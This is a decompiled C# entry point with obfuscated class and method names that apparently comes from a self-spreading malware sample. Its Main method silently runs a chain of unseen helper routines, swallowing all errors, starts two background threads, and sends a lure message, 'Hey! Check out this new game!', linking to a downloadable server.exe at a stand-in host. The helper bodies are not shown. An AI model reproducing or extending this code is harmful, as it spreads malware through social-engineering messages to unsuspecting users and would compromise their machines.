using System;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using ns1;

namespace ns2;

[StandardModule]
internal sealed class Class6
{
	private static int int_0;

	[STAThread]
	public static void Main()
	{
		try
		{
			Class5.smethod_0();
			Class5.smethod_13();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Class5.smethod_15("WindowsAPI");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Class5.smethod_10("Hey! Check out this new game! http://example.com/server.exe");
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread thread = new Thread((ThreadStart)Class5.smethod_7);
			thread.Start();
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread thread2 = new Thread((ThreadStart)Class5.smethod_17);
			thread2.Start();
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			Class5.smethod_12();
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			Class5.smethod_4();
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
			Class5.smethod_16();
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
			Class5.smethod_2();
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
		try
		{
			Class5.smethod_11();
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
		try
		{
			Class5.smethod_1("", "", "", "");
		}
		catch (Exception projectError11)
		{
			ProjectData.SetProjectError(projectError11);
			ProjectData.ClearProjectError();
		}
	}
}
